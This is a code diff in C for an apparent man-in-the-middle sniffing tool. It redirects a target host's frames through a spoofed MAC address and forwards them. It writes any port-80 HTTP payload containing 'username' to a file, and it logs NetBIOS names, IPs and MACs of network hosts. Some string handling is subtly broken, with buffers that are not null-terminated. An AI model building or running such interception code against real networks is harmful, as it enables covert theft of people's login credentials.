-  printf("\nTarget dst binary to string ipv4 =>%d.%d.%d.%d",(int)mask_bin[0],(int)mask_bin[1],(int)mask_bin[2],(int)mask_bin[3]); //debug
+   // 65 Header Size
+  //  printf("\n payload size :%d",DataSize);
    
-  getTargetInfo(mask,mask_mac);
+  //  if( (int)htons(tcp->dst_port) == 80 || (int)htons(tcp->src_port) == 80 ){
+  //   // printf("\n HTTP data.."); 
+  //   int header = 65 + dataStart;
+  //   if(DataSize - header > 0){
+  //       unsigned char data [DataSize-header];
+  //       // printf("\n Header Size :%d",header);
+  //       // printf("\n data size :%lu",sizeof(data));
+  //       memcpy(data,&buf[header], DataSize-header);
+
+  //       // printf("\n HTTP.. Payload ...");
+  //       // printf("\n src Addresss Decoded :%d.%d.%d.%d",(int)ipv4Header.src_addr[0], (int)ipv4Header.src_addr[1], (int)ipv4Header.src_addr[2], (int)ipv4Header.src_addr[3]);
+  //       // printf("\n Dst Addresss Decoded :%d.%d.%d.%d",(int)ipv4Header.dst_addr[0], (int)ipv4Header.dst_addr[1], (int)ipv4Header.dst_addr[2], (int)ipv4Header.dst_addr[3]);
+        
+  //       // //chk is trafic from target then forward
+  //       //int st = isFromTarget();
+
+  //       if(isFromTarget()){
+  //         printf("\n Is from target");
+  //         //Forward the tarfic 
+  //          memcpy(buf, &mask_mac, 6); // dst mac to mask mac 
+  //         //  memcpy(&buf[6], &targetMac, 6); // change src mac back to target
+  //          forward(buf);
+  //         //  exit(0);
+  //        if(strstr(data, "username"))
+  //         writeToFile(data,sizeof(data));
+  //       }
+  //   }
+  //  }
+  }
+}
+
+// Decode Http Packet
+void decodeHttp(unsigned char *buf,int debug){
+
+  int dataStart = (tcp.offset) * 4;
+  if(debug)
+    printf("\n data start :%d",dataStart);
   
-  //Create and bind sock for forwarding
-  setUpForwarding();
-  setUpReceveing();
+   // 65 Header Size
+  //  printf("\n payload size :%d",DataSize);
+   
+   if( (int)htons(tcp.dst_port) == 80 || (int)htons(tcp.src_port) == 80 ){
+    // printf("\n HTTP data.."); 
+    int header = 65 + dataStart;
+    if(DataSize - header > 0){
+        unsigned char data [DataSize-header];
+        
+        memcpy(data,&buf[header], DataSize-header);
+        if(debug){
+          printf("\n HTTP.. Payload ...");
+          printf("\n Header Size :%d",header);
+          printf("\n data size :%lu",sizeof(data));
+          printf("\n src Addresss Decoded :%d.%d.%d.%d",(int)ipv4Header.src_addr[0], (int)ipv4Header.src_addr[1], (int)ipv4Header.src_addr[2], (int)ipv4Header.src_addr[3]);
+          printf("\n Dst Addresss Decoded :%d.%d.%d.%d",(int)ipv4Header.dst_addr[0], (int)ipv4Header.dst_addr[1], (int)ipv4Header.dst_addr[2], (int)ipv4Header.dst_addr[3]);
+        }
+        if(isFromTarget()){
+          printf("\n Is from target");
+          //Forward the tarfic 
+           memcpy(buf, &mask_mac, 6); // dst mac to mask mac 
+          //  memcpy(&buf[6], &targetMac, 6); // change src mac back to target
+           forward(buf,1);
+          //  exit(0);
+         if(strstr(data, "username"))
+          writeToFile(data,sizeof(data));
+        }
+    }
+   }
+}
 
-  // socket_desc = socket(AF_PACKET, SOCK_PACKET,htons(0x0003));
+//Decode UDP 
+void decodeUDP(unsigned char *buf, UDP_packet *udp, int debug){
+  memcpy(udp,&buf[34],8);
+  if(debug){
+    printf("\n src port :%02X,%02X",udp->src_port[0],udp->src_port[1]);
+    printf("\n dst port :%02X,%02X",udp->dst_port[0],udp->dst_port[1]);
+    printf("\n len :%02X,%02X",udp->len[0],udp->len[1]);
+   }
+}
 
-  // if(socket_desc == -1){
-  //   printf("Failed to create socket ..\n");
-  // }
-  // else{
-    // printf("Socket created good to go :%d\n",socket_desc);
-    // printf("htons ... : %X\n",htons(0x0003));
-    int size =  sizeof addr;
-    int data;
-    while(run){
-      DataSize = data = recvfrom(receiverSock, buf, sizeof(buf), 0,NULL,NULL);
-      if(data < 0){
-        printf("\nCan not get any packets, status :%d",data);
+//Decode NetBIOS
+void decodeNetBIOS(unsigned char *buf, NetBIOS_packet *netBios, int debug, int log){
+  memcpy(netBios, &buf[42] ,82);
+
+  //debug
+  if(debug){
+    printf("\n src ip :%d.%d.%d.%d",(int)netBios->src_ip[0],(int)netBios->src_ip[1],(int)netBios->src_ip[2],(int)netBios->src_ip[3]);
+    printf("\n src port :%d",(int)htons(netBios->src_port));
+    printf("\n src name :%s",netBios->src_name);
+    unsigned char *decoded = decodeNetBIOS_Name(netBios->src_name);
+    printf("\n Decoded src :%s",decoded);
+    free(decoded);
+  }
+    
+  //write to file
+  if(log){ 
+    //  inet_pton(AF_INET, target, &saddr_ip.sin_addr);
+    FILE *logFile = fopen("/home/satyaprakash/Algo/log-NetBIOS-Map.txt","ar");
+      if(logFile == NULL){
+        printf("Failed to open file ..\n");
       }
       else{
-        // printf("\n.........Intercept Some data size..%d",data);
-        // fflush(stdout);
+         
+         //chk duplicat entrys
+        //  char ch;
+        //  int i = 0;//0-5 mac len
+        //  while(( ch = fgetc(logFile)) != EOF){
+        //     if(ch == eth.src_addr[i] || ch == 0x3a){ // 0x3a == ":"
+        //      if(ch != 0x3a)
+        //        i += 1;
+        //     }
+        //     else
+        //      i = 0;
 
-       
-        
-        //Filter 
-        if( buf[11] != target_mac[5] || buf[5] == mask_mac[5]){
-           printf("\r Packet droped %d byte ",DataSize);   
-           continue;
-        }
-        printf("\n\n"); 
-         // EtherNetFram eth;
-        decodeEther(buf,&eth,0);
+        //     if(i==6){
+        //       printf("\n Duplicate skip.");
+        //       break;
+        //     }
+        //  } 
+         
+        //  if(i == 6){
+        //    printf("\n function break");
+        //     return;
+        //   }
+           
+         printf("\n writing to File data");
+         fwrite(devider,1,71,logFile); //Devider
+         //src Mac 
+         fprintf(logFile,"\n src-mac: %02X:%02X:%02X:%02X:%02X:%02X",eth.src_addr[0], eth.src_addr[1], eth.src_addr[2], eth.src_addr[3], eth.src_addr[4], eth.src_addr[5]);
+         //dst Mac 
+        //  fprintf(logFile,"\n dst-mac: %02X:%02X:%02X:%02X:%02X:%02X",eth.dst_addr[0], eth.dst_addr[1], eth.dst_addr[2], eth.dst_addr[3], eth.dst_addr[4], eth.dst_addr[5]);
+         //src ip
+         fprintf(logFile,"\n src-ip: %d.%d.%d.%d",(int)netBios->src_ip[0],(int)netBios->src_ip[1],(int)netBios->src_ip[2],(int)netBios->src_ip[3]);
+         // src port
+         fprintf(logFile,"\n src-port: %d",(int)htons(netBios->src_port));
+         // src name
+         unsigned char *decoded_src = decodeNetBIOS_Name(netBios->src_name);
+         fprintf(logFile,"\n src: %s",decoded_src);
+         free(decoded_src);
+         //dst name
+         unsigned char *decoded_dst = decodeNetBIOS_Name(netBios->dst_name);
+         fprintf(logFile,"\n dst: %s",decoded_dst);
+         free(decoded_dst);
 
-        switch(htons(eth.type)){
-          
-          case 0x0800:
-            // printf("\r\a It's IPv4 Packet."); 
-            // IPv4Header ipv4Header;
-            decodeIPv4(buf,&ipv4Header);
-            if(ipv4Header.protocal == 0x06){ // its TCP
-              // printf("\n\n It's TCP Packet."); 
-              // TCP_packet tcp;
-              decodeTCP(buf,&tcp);
-            }
-          break;
-          
-          case 0x0806:
-              // printf("\n It's ARP Packet.\n"); 
-              // decodeARP( buf, &arp_packet);
-          break;
-
-          case 0x86DD:
-              // printf("\n It's IPv6 Packet.\n"); 
-          break;
-        }
+         fclose(logFile);
+        //  exit(0);
       }
-    //  system("clear");
-    }//While 
-  // }
- // close(socket_desc);
+  }
+}
+
+//Decode NetBIOS Name
+unsigned char* decodeNetBIOS_Name(unsigned char *encoded_name){
+  unsigned char A = 0x41; // ascii A in hex
+  unsigned char x,y;
+  unsigned char *decoded = (unsigned char *)malloc(16);
+  int j=0;
+  for(int i=1; i < 34; i+=2){
+      x = encoded_name[i];
+      y = encoded_name[i+1];
+      
+      // printf("\n norm x : %02x, %02x ", x,A);
+      x = x - A;
+      // printf(". norm x-! : %02x ", x);
+      x = x << 4;
+      // printf(". norm x << 4 : %02x",x);
+      
+      // printf("\n norm y : %02x, %02x ", y,A);
+      y = y - A;
+      // printf(". norm y-A : %02x",y);
+
+      x = x + y;
+      // printf("\n final X :%04x ascii :%c",x,x);
+      decoded[j] = x;
+      j+=1;
+  } 
+
+  return decoded;
 }
